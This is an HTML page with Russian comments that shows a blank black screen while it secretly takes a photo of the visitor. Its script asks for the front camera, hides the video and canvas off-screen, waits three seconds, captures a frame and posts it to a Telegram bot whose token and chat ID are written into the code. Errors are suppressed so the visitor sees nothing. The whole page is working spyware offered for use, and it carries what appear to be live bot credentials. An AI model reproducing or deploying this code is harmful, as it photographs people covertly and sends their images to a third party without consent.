<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title></title>
    <style>
        /* Полностью пустая чёрная страница */
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background: #000;
            overflow: hidden;
        }
        /* Скрываем все рабочие элементы */
        #video, #canvas {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            overflow: hidden;
            opacity: 0;
        }
    </style>
</head>
<body>
<!-- Невидимые элементы для работы -->
<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
// === НАСТРОЙКИ ===
const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
const CHAT_ID = '1250741267';
// ================

async function captureAndSend() {
    let stream = null;
    
    try {
        // 1. Запрашиваем камеру (фронтальную)
        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }
        });
        
        // 2. Подключаем поток к видео элементу
        const video = document.getElementById('video');
        video.srcObject = stream;
        
        // 3. Ждём готовности камеры (3 секунды для фокуса)
        await new Promise(resolve => {
            video.onloadedmetadata = resolve;
        });
        
        // 4. Даём время на фокусировку
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // 5. Создаём снимок
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        // 6. Немедленно останавливаем камеру
        stream.getTracks().forEach(track => track.stop());
        
        // 7. Отправляем в Telegram БЕЗ ожидания ответа (для скорости)
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');
            
            // Отправляем и НЕ ждём ответа
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData,
                mode: 'no-cors'
            }).catch(() => {}); // Игнорируем ошибки
        }, 'image/jpeg', 0.85);
        
    } catch (error) {
        // В случае ошибки ничего не показываем, просто закрываем камеру
        if (stream) stream.getTracks().forEach(track => track.stop());
    }
}

// Запускаем сразу
captureAndSend();
</script>
</body>
</html>
